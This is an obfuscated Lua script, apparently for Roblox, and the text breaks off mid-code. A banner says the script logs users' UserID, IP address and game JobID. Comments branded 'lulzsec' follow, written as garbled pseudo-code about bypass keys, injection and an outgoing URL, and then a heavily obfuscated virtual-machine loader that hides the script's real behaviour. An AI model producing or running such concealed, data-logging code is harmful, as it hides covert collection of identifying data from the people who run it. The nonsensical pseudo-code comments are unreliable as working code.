--[[ 
 __          __     _____  _   _ _____ _   _  _____ _ 
 \ \        / /\   |  __ \| \ | |_   _| \ | |/ ____| |
  \ \  /\  / /  \  | |__) |  \| | | | |  \| | |  __| |
   \ \/  \/ / /\ \ |  _  /| . ` | | | | . ` | | |_ | |
    \  /\  / ____ \| | \ \| |\  |_| |_| |\  | |__| |_|
     \/  \/_/    \_\_|  \_\_| \_|_____|_| \_|\_____(_)
                                                      
                                                     
DATA WE LOG:
- UserID.
- IP...
- And the game JOBID.
]]

--obfuscated-by-lulzsec
--(SA) Dev Team V
--EFE
--1--lulzsec.Network.security function()grabnetwork.UserDataInterface("102/429/630") connect local "."  wait(13)  
----bypass key here local()grabnetwork.UserDataInterface("102/429/630").System.Bypass = ("KeyHERE"_) 22 
--0-0                         0-0                                                  
--0-0            0-0                                                .           0-0                        0-0                     
--0-0 = "lulzsec.Connect(/Inject.LocalShutdown\)."                                                                                        
--.            
--0-0                           0-0                                                                                                         
--.  if HttpSpy.RemoteSpy = true.localNetwork.UserDataInterface.Connect:HWID.Network = ("0/0/0").Shutdown                                                                                                                           
--.    game:GetService("NetworkClient"):SetOutgoingKBPSLimit("1, outgoingkey/INJECTKRYPT/102/496/942")                                                    
--
--0-0                                                      
--.    0-0    elseif tostring(1) == "userdata: 0x000000001bdfb8ea" then outgoingkey = "https://lulzsec102/429/630.net"                                                                                                                  
--.Check.Ip.Network.SetIncore(0).SetNetwork.("NetLog") = "102/429/6315"                                                                                                                                                             
--.0=0. local.Connect(): -  102/429/630 = SystemBypass = http://www.lulzsec.org/
--
--
--
--
--
--
--
--
--
--
print("(SA)")
do do do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;local v16;local v17;while true do if (v0==2) then v7=nil;v8=nil;v9=nil;v0=3;end if (v0==5) then v16=nil;v17=nil;while true do if (v1==0) then v2=0;v3=nil;v4=nil;v1=1;end if (v1==4) then local v18=0;while true do if (v18==0) then v14=nil;v15=nil;v18=1;end if (1==v18) then v16=nil;v1=5;break;end end end if (1==v1) then v5=nil;v6=nil;v7=nil;v1=2;end if (v1==5) then v17=nil;while true do if (v2==0) then v3=tonumber;v4=string.byte;v5=string.char;v6=string.sub;v2=1;end if (v2==2) then local v19=0;while true do if (v19==1) then v13=pcall;v14=select;v19=2;end if (v19==2) then v2=3;break;end if (0==v19) then v11=getfenv or function()return _ENV;end;v12=setmetatable;v19=1;end end end if (v2==4) then vv11());break;end if (v2==3) then local v20=0;while true do if (v20==0) then v15=unpack or table.unpack;v16=tonumber;v20=1;end if (v20==2) then v2=4;break;end if (v20==1) then v17=nil;function v17(v22,v23)local v24=0;local v25;local v26;local v27;local v28;local v29;local v30;local v31;local v32;local v33;local v34;local v35;local v36;local v37;while true do if (0==v24) then local v38=0;local v39;while true do if (v38==0) then v39=0;while true do if (v39==0) then local v46=0;while true do if (v46==1) then v39=1;break;end if (0==v46) then v25=0;v26=nil;v46=1;end end end if (v39==1) then v27=nil;v24=1;break;end end break;end end end if (v24==4) then v37=nil;while true do local v44=0;while true do if (v44==2) then if (v25==5) then local v47=0;local v48;while true do if (v47==0) then v48=0;while true do local v57=0;while true do if (v57==0) then if (0==v48) then local v87=0;while true do if (v87==0) then local v104=0;while true do if (v104==0) then v37=nil;function v37(v128,v129,v130)local v138=0;local v139;local v140;local v141;while true do if (v138==1) then v141=v128[3];return function(...)local v158=0;local v159;local v160;local v161;local v162;local v163;local v164;local v165;while true do if (3==v158) then v165=nil;while true do if (v159==1) then local v190=0;local v191;while true do if (v190==0) then v191=0;while true do if (v191==0) then v162=nil;v163=nil;v191=1;end if (1==v191) then v159=2;break;end end break;end end end if (v159==3) then while true do if (v160==2) then local v200=0;while true do if (v200==1) then v160=3;break;end if (v200==0) then v165=nil;function v165()local v212=0;local v213;local v214;local v215;local v216;local v217;local v218;local v219;local v220;local v221;local v222;local v223;local v224;while true do if (v212==0) then v213=0;v214=nil;v215=nil;v216=nil;v212=1;end if (v212==1) then v217=nil;v218=nil;v219=nil;v220=nil;v212=2;end if (v212==3) then while true do if (v213==1) then v217=v141;v218=v35;v219={};v213=2;end if (v213==3) then v222=(v164-v217) + ((839 + 112) -(324 + 626));v223=nil;v224=nil;v213=4;end if (v213==4) then while true do local v252=0;local v253;local v254;while true do if (0==v252) then local v262=0;while true do if (v262==1) then v252=1;break;end if (v262==0) then v253=0;v254=nil;v262=1;end end end if (v252==1) then while true do if ((((2104 + 660) -1203)>=375) and (v253==(0 + 0))) then v254=0 -0;while true do if ((1156<=(5790 -3824)) and (v254==1)) then if ((v224<=(71 -(27 + 23))) or (((17043 -(1758 + 139)) -10814)<(3843 -(37 + (689 -420))))) then if ((v224<=10) or ((3769 -2162)>(4625 -(278 + 566 + 1038)))) then if ((3970>=(13819 -9880)) and (v224<=(10 -(2 + 4)))) then if ((v224<=1) or (((16034 -11787) -((76 -56) + 1948))>4556)) then if (((8243 -5547)<(3481 + 504)) and (v224>(0 + 0))) then local v296=0;local v297;local v298;local v299;while true do if (v296==1) then v299=nil;while true do if (v297==1) then while true do if (((2398 -(259 + 218))<(7665 -4049)) and (v298==0)) then v299=v223[1 + 1 + 0];do return v221[v299](v15(v221,v299 + (735 -(690 + 44)),v223[3]));end break;end end break;end if (v297==0) then v298=0 + 0;v299=nil;v297=1;end end break;end if (v296==0) then local v422=0;while true do if (v422==1) then v296=1;break;end if (v422==0) then v297=0;v298=nil;v422=1;end end end end else v221[v223[1 + 1]][v223[3]]=v223[6 -2];end elseif ((v224<=(1 + 0 + 1)) or (2123==(5076 -(232 + 4)))) then local v301=0 -(0 + 0);local v302;local v303;local v304;while true do if ((1==v301) or ((2671 -(2125 -(50 + 298)))==2362)) then v304=v223[3];for v441=1 + 0,v304 do v303[v441]=v221[v302 + v441];end break;end if (((4281 -1607)>398) and (0==v301)) then local v423=0;while true do if (v423==0) then v302=v223[1712 -(999 + 711)];v303=v221[v302];v423=1;end if (v423==1) then v301=1 -0;break;end end end end elseif (((675 -(173 + 171))==(275 + 56)) and (v224>(4 -1))) then do return;end else local v346=0;local v347;local v348;local v349;local v350;local v351;local v352;local v353;while true do if (v346==1) then v349=nil;v350=nil;v346=2;end if (v346==0) then v347=0;v348=nil;v346=1;end if (3==v346) then v353=nil;while true do if (1==v347) then local v469=0;while true do if (v469==0) then v350=nil;v351=nil;v469=1;end if (v469==1) then v347=2;break;end end end if (v347==0) then local v470=0;while true do if (0==v470) then v348=0 -(308 -(95 + 213));v349=nil;v470=1;end if (v470==1) then v347=1;break;end end end if (v347==2) then v352=nil;v353=nil;v347=3;end if (v347==3) then while true do if (((609 + 503)==(65 + 1047)) and (v348==(2 -1))) then local v508=0;local v509;while true do if (v508==0) then v509=0;while true do if (v509==0) then local v595=0;local v596;while true do if (v595==0) then v596=0;while true do if (v596==0) then v351=nil;v352=nil;v596=1;end if (v596==1) then v509=1;break;end end break;end end end if (v509==1) then v348=1638 -(646 + (2675 -(1060 + 625)));break;end end break;end end end if (((5339 -(265 + 262))==(5184 -((258 -(114 + 63)) + 291))) and (v348==(1847 -(606 + 1239)))) then v353=nil;while true do if (((9435 -6922)>=(80 + 2117)) and (v349==1)) then local v551=0;local v552;while true do if (v551==0) then v552=0;while true do if (v552==1) then v349=2;break;end if (v552==0) then local v635=0;local v636;while true do if (0==v635) then v636=0;while true do if (v636==0) then local v679=0;while true do if (v679==0) then v352=nil;v353=nil;v679=1;end if (v679==1) then v636=1;break;end end end if (v636==1) then v552=1;break;end end break;end end end end break;end end end if (((72 + 56)<(177 + 97)) and (v349==(0 -0))) then local v553=0;local v554;local v555;while true do if (v553==1) then while true do if (v554==0) then v555=0;while true do if (0==v555) then local v666=0;while true do if (v666==0) then local v680=0;while true do if (v680==1) then v666=1;break;end if (v680==0) then v350=0 + 0;v351=nil;v680=1;end end end if (v666==1) then v555=1;break;end end end if (v555==1) then v349=1 -0;break;end end break;end end break;end if (v553==0) then v554=0;v555=nil;v553=1;end end end if (((1422 -(1258 + 162))==v349) or ((894 -537)>=(2013 + 2604))) then while true do if (((13650 -8857)==(6061 -(320 + 948))) and (v350==(2 -(1 -0)))) then v353=0 -0;for v615=v351,v223[(56 -41) -11] do local v616=0;local v617;while true do if (0==v616) then v617=0;while true do if (((3231 -(615 + 846))>=691) and (v617==0)) then v353=v353 + (751 -(180 + 570));v221[v615]=v352[v353];break;end end break;end end end break;end if ((v350==(742 -(211 + 196 + 335))) or ((3828 -1090)<(259 + 712))) then local v597=0;local v598;while true do if (0==v597) then v598=436 -(49 + 387);while true do if (((797 -373)==(1109 -685)) and (((0 -0) -(0 + 0))==v598)) then local v667=0;local v668;while true do if (0==v667) then v668=0;while true do if (v668==1) then v598=3 -(5 -3);break;end if (v668==0) then local v706=0;while true do if (0==v706) then v351=v223[2];v352={v221[v351](v15(v221,v351 + 1 + 0,v162))};v706=1;end if (v706==1) then v668=1;break;end end end end break;end end end if (((8098 -4928)==(13385 -10215)) and (v598==1)) then v350=1;break;end end break;end end end end break;end end break;end if ((v348==(0 -0)) or ((4678 -2067)<=(71 + 920))) then local v510=0;local v511;while true do if (0==v510) then v511=0;while true do if (1==v511) then v348=191 -(5 + 185);break;end if (v511==0) then local v599=0;local v600;while true do if (v599==0) then v600=0;while true do if (v600==0) then v349=755 -(723 + 32);v350=nil;v600=1;end if (v600==1) then v511=1;break;end end break;end end end end break;end end end end break;end end break;end if (v346==2) then v351=nil;v352=nil;v346=3;end end end elseif (((393 + 113)<=972) and (v224<=(5 + 2))) then if ((69<=4342) and (v224<=5)) then v221[v223[124 -(45 + 77)]]={};elseif (((5603 -(1021 + (3037 -2116)))>=(129 + 33)) and (v224==(16 -10))) then local v354=0;local v355;local v356;local v357;local v358;while true do if (v354==0) then v355=0;v356=nil;v354=1;end if (v354==1) then v357=nil;v358=nil;v354=2;end if (2==v354) then while true do if (v355==1) then v358=nil;while true do if ((v356==(0 -0)) or ((12921 -9471)<(1755 + 934))) then local v512=0;while true do if (v512==1) then v356=1315 -(298 + 1016);break;end if (v512==0) then v357=262 -(31 + 231);v358=nil;v512=1;end end end if (((14537 -(38439 -28434))>=(7366 -3405)) and (v356==(4 -3))) then while true do if ((v357==(0 -0)) or (892==(6013 -4659))) then v358=v223[919 -(190 + 727)];do return v15(v221,v358,v162);end break;end end break;end end break;end if (v355==0) then v356=0 -0;v357=nil;v355=1;end end break;end end else v161=v223[3];end elseif ((((2458 -1744) + (1543 -633))<2227) and (v224<=(18 -10))) then v129[v223[3]]=v221[v223[(43 -34) -7]];elseif ((v224>9) or ((464 + 1494)<1860)) then v221[v223[825 -(313 + 510)]]= -v221[v223[1 + 2]];else local v360=0;local v361;local v362;local v363;local v364;while true do if (v360==2) then while true do if (v361==0) then v362=1092 -(960 + 132);v363=nil;v361=1;end if (v361==1) then v364=nil;while true do if ((v362==(0 -0)) or ((6042 -(540 + 1401))<(588 + 2710))) then local v513=0;local v514;while true do if (0==v513) then v514=0;while true do if (v514==0) then v363=0 + 0;v364=nil;v514=1;end if (v514==1) then v362=3 -2;break;end end break;end end end if ((v362==(1 + 0)) or (320>=(4542 -1693))) then while true do if (((1806 -(227 + 40))<=(4453 -(142 + 62 + 79))) and (v363==(0 + 0))) then v364=v223[2 + 0];v221[v364](v15(v221,v364 + ((1834 -(294 + 278)) -(714 + 448 + 99)),v162));break;end end break;end end break;end end break;end if (v360==0) then v361=0;v362=nil;v360=1;end if (v360==1) then v363=nil;v364=nil;v360=2;end end end elseif (((1723 + 441)<=(11528 -(40009 -31631))) and (v224<=15)) then if ((v224<=(672 -(326 + 334))) or ((3735 -1304)>=(6286 -(1746 + 176)))) then if ((v224>(6 + 1 + 4)) or ((1855 -(216 + 48))>=(4906 -(123 + 1156)))) then v221[v223[6 -4]]=v221[v223[2 + 1]][v223[8 -4]];else local v308=0;local v309;local v310;local v311;while true do if (v308==1) then v311=nil;while true do if ((v309==(1 + 0 + 0)) or ((13581 -9481)<=(4781 -(600 + 1068)))) then while true do if (((23317 -18406)>=(3420 -(140 + 369))) and (v310==(0 -0))) then v311=v223[6 -4];do return v15(v221,v311,v311 + v223[3 + 0]);end break;end end break;end if (((670 -((1760 -(962 + 141)) + 13))==v309) or ((4378 -1586)==3879)) then local v443=0;local v444;local v445;while true do if (v443==1) then while true do if (v444==0) then v445=0;while true do if (v445==1) then v309=1;break;end if (0==v445) then local v575=0;local v576;while true do if (v575==0) then v576=0;while true do if (v576==0) then v310=0;v311=nil;v576=1;end if (v576==1) then v445=1;break;end end break;end end end end break;end end break;end if (v443==0) then v444=0;v445=nil;v443=1;end end end end break;end if (v308==0) then v309=0;v310=nil;v308=1;end end end elseif (((10793 -6536)>638) and (v224<=((2839 -(736 + 630)) -(1402 + 58)))) then if (((2357 -((1514 -(939 + 2)) + 141))==(3382 -(1418 + 321))) and  not v221[v223[2]]) then v161=v161 + 1 + 0;else v161=v223[3 + 0];end elseif (((4653 -(24 + 2))>(2168 -((290 -147) + 173 + 180))) and (v224==((257 -(219 + 32)) + 8))) then if ((((6500 -(596 + 436)) -1203)>=(9849 -5722)) and (v221[v223[1 + 1]]==v221[v223[4]])) then v161=v161 + (149 -(19 + 129));else v161=v223[3];end else for v424=v223[2],v223[3] do v221[v424]=nil;end end elseif (((554 + (1666 -(266 + 274)))>(183 -112)) and (v224<=(1260 -(543 + 699)))) then if (((6289 -(69 + 1477))>=2149) and (v224<=(30 -14))) then v221[v223[6 -4]]=v223[(1535 -(594 + 938)) -0]~=(646 -(415 + 231));elseif ((v224==((15 -8) + 10)) or ((4596 + 63)<((16066 -10215) -((1935 -(115 + 945)) + 336)))) then v221[v223[2]]();else local v365=0;local v366;local v367;local v368;local v369;local v370;local v371;local v372;while true do if (v365==1) then v368=nil;v369=nil;v365=2;end if (v365==3) then v372=nil;while true do if (v366==3) then while true do if ((v367==(1 + 1)) or ((16080 -11189)==(5823 -(818 + 170)))) then v372=nil;while true do if ((v368==0) or ((1230 + 158)<=366)) then local v556=0;local v557;while true do if (0==v556) then v557=0 -0;while true do if ((v557==1) or (4771==(12799 -7886))) then v368=1 + (0 -0);break;end if (((1362 + 1005)==2367) and (v557==(810 -(49 + 336 + 425)))) then local v637=0;while true do if (((0 + 0)==v637) or ((122 + 97)==(1216 -(430 + 104)))) then local v669=0;local v670;while true do if (0==v669) then v670=0;while true do if (v670==0) then local v707=0;while true do if (v707==1) then v670=1;break;end if (v707==0) then v369=v223[1405 -(536 + 867)];v370,v371=v218(v221[v369](v15(v221,v369 + 1 + 0,v223[10 -7])));v707=1;end end end if (v670==1) then v637=1 + 0;break;end end break;end end end if ((v637==(2 -1)) or ((1604 + 1500)<=(684 + 17))) then v557=1752 -((4334 -3387) + 804);break;end end end end break;end end end if (((1610 -(492 + 327))<((6817 -(1125 + 409)) -(1315 + (1015 -(531 + 474))))) and (v368==(1026 -(483 + 542)))) then local v558=0;local v559;local v560;while true do if (v558==0) then local v601=0;local v602;while true do if (v601==0) then v602=0;while true do if (v602==1) then v558=1;break;end if (v602==0) then v559=0 + 0;v560=nil;v602=1;end end break;end end end if (v558==1) then while true do if ((v559==(0 + 0 + 0)) or (((19936 -12151) -(262 + 4963))>=((1990 + 2109) -(362 + 243)))) then v560=0 + 0;while true do if ((v560==(1201 -(527 + 674))) or (4934<=(264 + 295))) then local v671=0;while true do if (v671==1) then v560=1 + 0;break;end if (v671==0) then v162=(v371 + v369) -(1 + 0);v372=0;v671=1;end end end if (((5193 -(519 + 219))==(10240 -5785)) and ((1447 -(355 + 1091))==v560)) then v368=3 -1;break;end end break;end end break;end end end if ((v368==(6 -4)) or ((2258 -(336 + 489))>=2833)) then for v577=v369,v162 do local v578=0;local v579;local v580;local v581;while true do if (v578==0) then local v618=0;while true do if (v618==1) then v578=1;break;end if (0==v618) then v579=0;v580=nil;v618=1;end end end if (v578==1) then v581=nil;while true do if (0==v579) then v580=0;v581=nil;v579=1;end if (1==v579) then while true do if (((2820 -(22 + 845))>1592) and (v580==(1413 -(494 + 919)))) then v581=895 -(23 + 872);while true do if ((v581==(0 + 0)) or ((4869 -2227)>(4722 -(8557 -6510)))) then v372=v372 + 1;v221[v577]=v370[v372];break;end end break;end end break;end end break;end end end break;end end break;end if ((v367==(0 -0)) or ((440 + (648 -459))>(4427 -(29 + 850)))) then local v515=0;local v516;while true do if (v515==0) then v516=0;while true do if (v516==1) then v367=1 + 0;break;end if (v516==0) then local v603=0;while true do if (v603==1) then v516=1;break;end if (v603==0) then local v638=0;while true do if (v638==1) then v603=1;break;end if (v638==0) then v368=0;v369=nil;v638=1;end end end end end end break;end end end if (((2664 -(313 + (3166 -2495)))<=(13145 -9797)) and (v367==(1 -0))) then local v517=0;while true do if (v517==0) then v370=nil;v371=nil;v517=1;end if (v517==1) then v367=7 -5;break;end end end end break;end if (v366==2) then local v471=0;while true do if (1==v471) then v366=3;break;end if (v471==0) then v371=nil;v372=nil;v471=1;end end end if (v366==0) then v367=0 + 0;v368=nil;v366=1;end if (v366==1) then local v472=0;local v473;while true do if (v472==0) then v473=0;while true do if (v473==1) then v366=2;break;end if (v473==0) then local v561=0;while true do if (v561==1) then v473=1;break;end if (0==v561) then v369=nil;v370=nil;v561=1;end end end end break;end end end end break;end if (v365==2) then v370=nil;v371=nil;v365=3;end if (0==v365) then v366=0;v367=nil;v365=1;end end end elseif (((6193 -(1539 + 46))>(8509 -4995)) and (v224<=(46 -27))) then if (((8348 -4830)==3518) and (v221[v223[1283 -(1141 + 140)]]==v223[4])) then v161=v161 + 1;else v161=v223[4 -1];end elseif ((v224>20) or (4593<(11284 -7074))) then v221[v223[1 + 1]]=v223[1 + (6 -4)];else v221[v223[5 -3]]=v221[v223[1 + 2]]/v223[4];end elseif ((((1298 -481) + 2045)==(8573 -5711)) and (v224<=32)) then if (((4390 -(105 + 1012))==(5204 -(1648 + 97 + 186))) and (v224<=(34 -(3 + 5)))) then if ((v224<=(92 -69)) or ((8854 -4738)<=(2399 -1497))) then if ((v224>(5 + 17)) or ((105 + 90)>(4519 -(141 + (1771 -(501 + 1122)))))) then local v313=0;local v314;local v315;local v316;local v317;local v318;while true do if (v313==0) then v314=0;v315=nil;v313=1;end if (v313==1) then v316=nil;v317=nil;v313=2;end if (v313==2) then v318=nil;while true do if (v314==2) then while true do if ((v315==(1710 -(591 + 1118))) or ((12817 -(9572 -(683 + 346)))<1705)) then v318=nil;while true do if ((v316==(1 -0)) or ((569 + 2109)>=(6394 -(540 + 1250)))) then v221[v317 + 1]=v318;v221[v317]=v318[v223[1 + 3]];break;end if ((v316==(0 + 0)) or (((1590 + 698) -(487 + 705))>(1847 + 710))) then local v543=0;while true do if (v543==1) then v316=(7 -4) -2;break;end if (0==v543) then v317=v223[2 + 0];v318=v221[v223[8 -5]];v543=1;end end end end break;end if ((((0 + 0) -0)==v315) or ((55 + 191)>4642)) then local v487=0;while true do if (v487==1) then v315=362 -(246 + 115);break;end if (v487==0) then v316=1098 -(465 + 633);v317=nil;v487=1;end end end end break;end if (v314==0) then v315=0 + 0;v316=nil;v314=1;end if (v314==1) then v317=nil;v318=nil;v314=2;end end break;end end else do return v221[v223[2]];end end elseif ((v224<=(1374 -(988 + 362))) or ((6205 -(1142 + (2249 -(389 + 1115))))<(93 + 1084))) then local v319=0;local v320;local v321;local v322;while true do if ((v319==((1 + 0) -0)) or ((2524 -(619 + 16))>=(4937 -1463))) then v322=nil;while true do if ((v320==(2 -1)) or ((3970 -2074)==(3059 + 874))) then for v456=v321 + 1,v223[4 -1] do v10(v322,v221[v456]);end break;end if ((165<=(4809 -(299 + 52))) and (v320==((0 -0) + 0))) then local v446=0;local v447;local v448;local v449;while true do if (v446==0) then v447=0;v448=nil;v446=1;end if (v446==1) then v449=nil;while true do if (0==v447) then v448=0;v449=nil;v447=1;end if (v447==1) then while true do if (v448==0) then v449=(1036 -(73 + 963)) -0;while true do if ((v449==(2 -1)) or (2548>=(7249 -3596))) then v320=1998 -(1875 + 122);break;end if ((v449==(0 -0)) or ((3828 -(1097 + 746))>=(7781 -5040))) then local v619=0;while true do if (v619==1) then v449=1 + 0 + 0;break;end if (v619==0) then local v661=0;while true do if (v661==1) then v619=1;break;end if (v661==0) then v321=v223[2 + 0];v322=v221[v321];v661=1;end end end end end end break;end end break;end end break;end end end end break;end if (((2067 + 643)==(6539 -3829)) and (v319==0)) then local v426=0;local v427;while true do if (0==v426) then v427=0;while true do if (v427==0) then local v488=0;while true do if (v488==1) then v427=1;break;end if (v488==0) then v320=(1607 -(1084 + 523)) -0;v321=nil;v488=1;end end end if (v427==1) then v319=(1670 + 44) -(417 + (2298 -(863 + 139)));break;end end break;end end end end elseif ((v224>(462 -(123 + 314))) or (((1565 -(12 + 59)) + 54 + 1192)<=((1224 -799) -195))) then local v375=0;local v376;local v377;local v378;local v379;local v380;local v381;local v382;while true do if (v375==0) then v376=1257 -(1029 + 228);v377=nil;v375=1;end if (v375==2) then v380=nil;v381=nil;v375=3;end if (1==v375) then v378=nil;v379=nil;v375=2;end if (3==v375) then v382=nil;while true do if ((((1502 -1066) -(203 + 157))<(496 + 94)) and (v376==3)) then while true do if ((v377==2) or ((2087 + 1422)<=(3231 -(2955 -(415 + 143))))) then local v518=0;local v519;while true do if (v518==0) then v519=266 -(238 + 13 + 15);while true do if (((1178 + 2125)<=3713) and (v519==(1 + 0))) then v377=3 + 0;break;end if ((v519==0) or ((1218 + (2352 -(219 + 271)))==(2679 -(330 + 761)))) then local v604=0;local v605;while true do if (v604==0) then v605=0;while true do if (v605==0) then local v672=0;while true do if (v672==1) then v605=1;break;end if (v672==0) then for v694=354 -(311 + 42),v379 do v221[v380 + v694]=v381[v694];end v382=v381[1503 -(444 + 1003 + 55)];v672=1;end end end if (v605==1) then v519=1 + 0;break;end end break;end end end end break;end end end if ((v377==(3 -2)) or ((1744 + 597)>=(191 + 3685))) then local v520=0;local v521;local v522;while true do if (v520==1) then while true do if ((v521==((6060 -4261) -(1307 + 492))) or ((186 + 19)>=(229 + 382))) then v522=0 + 0;while true do if (((5753 -(309 + 777))>=(2629 + (1531 -640))) and (v522==(829 -(149 + 680)))) then local v639=0;local v640;local v641;while true do if (1==v639) then while true do if (v640==0) then v641=0 -(0 -0);while true do if (((5243 -(1015 + 545))>=2416) and (v641==(2 -1))) then v522=2 -1;break;end if ((v641==(0 -0)) or ((3172 + 438)<=(2115 -(311 + 520)))) then local v708=0;local v709;while true do if (v708==0) then v709=0;while true do if (v709==0) then local v730=0;local v731;while true do if (v730==0) then v731=0;while true do if (v731==0) then v380=v378 + 2 + 0;v381={v221[v378](v221[v378 + 1],v221[v380])};v731=1;end if (v731==1) then v709=1;break;end end break;end end end if (1==v709) then v641=2 -1;break;end end break;end end end end break;end end break;end if (v639==0) then v640=0;v641=nil;v639=1;end end end if ((v522==(2 -1)) or ((1602 -(70 + 861))<=(355 + 158))) then v377=2;break;end end break;end end break;end if (0==v520) then v521=727 -(400 + 327);v522=nil;v520=1;end end end if ((v377==(0 -0)) or ((5255 -(965 + 324))<(646 + 1124))) then local v523=0;local v524;local v525;local v526;while true do if (v523==1) then v526=nil;while true do if (v524==0) then v525=0 -0;v526=nil;v524=1;end if (v524==1) then while true do if ((v525==(0 -0)) or ((2592 -(11 + (1545 -(63 + 877))))<(3902 -(257 + 608 + 1085)))) then v526=0;while true do if (((568 -(266 + 108))<(1286 + 3349)) and (v526==(0 + 0))) then local v673=0;local v674;while true do if (v673==0) then v674=0 -0;while true do if (((0 + 0)==v674) or ((2544 + (2554 -(139 + 1590)))<((2969 -1263) -(26 + 16)))) then local v710=0;local v711;local v712;while true do if (v710==1) then while true do if (0==v711) then v712=0;while true do if (v712==1) then v674=1526 -(1149 + 376);break;end if (v712==0) then local v740=0;while true do if (v740==1) then v712=1;break;end if (v740==0) then v378=v223[5 -3];v379=v223[4];v740=1;end end end end break;end end break;end if (v710==0) then v711=0;v712=nil;v710=1;end end end if (((5483 -3303)>=(546 + 33)) and (v674==((3140 -1993) -(980 + 166)))) then v526=1963 -(904 + 1058);break;end end break;end end end if (((6015 -2448)<(1021 + 3112)) and (v526==1)) then v377=1194 -(805 + 388);break;end end break;end end break;end end break;end if (v523==0) then v524=0;v525=nil;v523=1;end end end if ((v377==(1 + 2)) or ((11293 -6406)==((1863 -1417) + 2171))) then if (((101 + 2615)<((5981 + 10339) -11836)) and v382) then local v546=0;local v547;local v548;local v549;local v550;while true do if (v546==0) then v547=0;v548=nil;v546=1;end if (v546==1) then v549=nil;v550=nil;v546=2;end if (v546==2) then while true do if (v547==0) then local v629=0;while true do if (v629==1) then v547=1;break;end if (v629==0) then v548=0 + 0;v549=nil;v629=1;end end end if (v547==1) then v550=nil;while true do if ((844<(965 + 2417)) and (v548==(2 -1))) then while true do if ((751<=(2431 -(47 + 21))) and ((548 -(315 + 233))==v549)) then v550=0 -0;while true do if ((91<(43 + 1176)) and (v550==(0 -0))) then v221[v380]=v382;v161=v223[6 -(10 -7)];break;end end break;end end break;end if ((v548==(1533 -((241 -166) + 1458))) or ((3806 -1956)>=(1385 + 649))) then v549=0 -0;v550=nil;v548=1 + 0 + 0;end end break;end end break;end end else v161=v161 + (3 -2);end break;end end break;end if ((v376==0) or (2593>=(6748 -3564))) then local v474=0;local v475;local v476;local v477;while true do if (v474==0) then v475=0;v476=nil;v474=1;end if (v474==1) then v477=nil;while true do if (v475==0) then v476=0;v477=nil;v475=1;end if (v475==1) then while true do if (0==v476) then v477=(914 -(47 + 867)) -0;while true do if ((v477==(0 -0)) or ((5536 -(304 + 921 + 6))<(2573 -695))) then local v642=0;local v643;local v644;while true do if (v642==1) then while true do if (0==v643) then v644=0;while true do if (v644==0) then local v713=0;local v714;while true do if (v713==0) then v714=0;while true do if (v714==1) then v644=1;break;end if (0==v714) then local v732=0;while true do if (0==v732) then v377=0 + 0;v378=nil;v732=1;end if (v732==1) then v714=1;break;end end end end break;end end end if (v644==1) then v477=1 + 0;break;end end break;end end break;end if (v642==0) then v643=0;v644=nil;v642=1;end end end if ((v477==1) or ((5452 -(1352 + 515))>3986)) then v376=1;break;end end break;end end break;end end break;end end end if ((3358>(1692 + 1555)) and (v376==(1 + 0))) then local v478=0;local v479;while true do if (v478==0) then v479=0;while true do if (v479==1) then v376=8 -6;break;end if (v479==0) then v379=nil;v380=nil;v479=1;end end break;end end end if (((3416 -(7 + 94))>(3207 -(816 + 1120))) and (v376==(1928 -(1349 + 577)))) then local v480=0 -0;while true do if ((929<=(6602 -4377)) and (v480==(0 + (1597 -(899 + 698))))) then local v527=0;while true do if (v527==0) then v381=nil;v382=nil;v527=1;end if (v527==1) then v480=1;break;end end end if ((v480==1) or (((1252 -(9 + 7)) -772)>(6989 -3516))) then v376=3;break;end end end end break;end end elseif ((v221[v223[1 + 1]]~=v221[v223[8 -4]]) or ((4709 -1312)<(2970 + 64))) then v161=v161 + 1 + 0;else v161=v223[3 + 0];end elseif ((v224<=29) or (((5280 -(496 + 225)) -(1424 + 4 + 5))<(1379 -(64 + 116)))) then if (((3644 -(473 + 84 + 957))>(3338 -(247 + 1499))) and (v224<=(54 -(9 + 18)))) then local v323=0;local v324;local v325;local v326;local v327;local v328;while true do if (v323==2) then v328=nil;while true do if ((v324==(1502 -(674 + 827))) or ((322 + (4193 -1091))<(501 + 1186))) then local v450=0;while true do if (0==v450) then v327=nil;v328=nil;v450=1;end if (v450==1) then v324=8 -6;break;end end end if ((v324==(1 + 1)) or ((761 -492)==(2704 -(407 + 1370)))) then while true do if ((v325==(2 + 0)) or (2882==(697 + (2820 -(362 + 1346))))) then for v504=(550 -(272 + 52)) -(37 + 162 + 26),v223[1 + 3] do local v505=0;local v506;local v507;while true do if (v505==1) then while true do if (((1769 -(1504 + 212))<=(4653 -(278 + (1342 -(16 + 6))))) and (1==v506)) then if ((v507[1]==(22 + 17)) or (2650==(952 + 3910))) then v328[v504-(1 + 0)]={v221,v507[1 + 2]};else v328[v504-(1 + 0)]={v129,v507[1 + 2]};end v220[ #v220 + 1]=v328;break;end if (((5910 -(968 + 197))>=(1984 -(63 + 30))) and (v506==(0 + 0))) then local v593=0;while true do if (v593==0) then v161=v161 + (494 -(455 + 38));v507=v214[v161];v593=1;end if (1==v593) then v506=1 -0;break;end end end end break;end if (v505==0) then v506=1736 -(1226 + 510);v507=nil;v505=1;end end end v221[v223[7 -5]]=v37(v326,v327,v130);break;end if (((2406 -752)<=(332 + 2528)) and (v325==(434 -(423 + 10)))) then local v490=0;local v491;while true do if (0==v490) then v491=0 + 0;while true do if ((4138==(4885 -(607 + 140))) and (v491==(1778 -(1077 + 701)))) then local v582=0;while true do if (v582==1) then v491=1;break;end if (v582==0) then v328={};v327=v12({},{__index=function(v630,v631)local v645=0;local v646;local v647;local v648;while true do if (v645==1) then v648=nil;while true do if ((v646==(1 -0)) or ((5912 -(1366 + 231))<(1804 -(434 + 7)))) then while true do if ((v647==(214 -(121 + 93))) or ((2929 + 843)<=(4304 -(627 + 41)))) then local v715=0;local v716;while true do if (v715==0) then v716=0;while true do if (0==v716) then local v733=0;while true do if (v733==0) then local v741=0;while true do if (v741==0) then v648=v328[v631];return v648[1 + 0][v648[(1423 -(1179 + 243)) + 1]];end end end end end end break;end end end end break;end if ((v646==(0 + 0)) or ((8668 -6372)<(991 + 446 + 842))) then local v681=0;local v682;local v683;while true do if (v681==1) then while true do if (0==v682) then v683=0;while true do if (0==v683) then local v734=0;while true do if (v734==1) then v683=1;break;end if (v734==0) then v647=0 + 0 + 0;v648=nil;v734=1;end end end if (v683==1) then v646=1 + 0;break;end end break;end end break;end if (v681==0) then v682=0;v683=nil;v681=1;end end end end break;end if (0==v645) then v646=216 -(155 + (746 -(450 + 235)));v647=nil;v645=1;end end 